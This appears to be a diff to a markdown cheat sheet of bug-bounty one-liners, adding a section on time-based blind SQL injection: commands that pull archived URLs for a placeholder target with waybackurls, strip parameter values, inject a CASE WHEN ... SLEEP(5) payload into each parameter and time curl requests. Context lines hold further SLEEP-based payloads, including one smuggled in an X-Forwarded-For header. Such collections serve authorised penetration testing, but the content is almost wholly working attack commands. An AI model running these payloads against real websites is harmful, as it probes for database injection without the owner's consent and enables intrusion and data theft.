@@ -49,6 +49,15 @@ cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),slee
 ```
 cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
 ```
+
+### Time based SQL injection using Waybackurls
+
+```
+waybackurls https://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
+```
+```
+cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
+```
 ────────────────────────────────────────────────────────────────────────
 
 
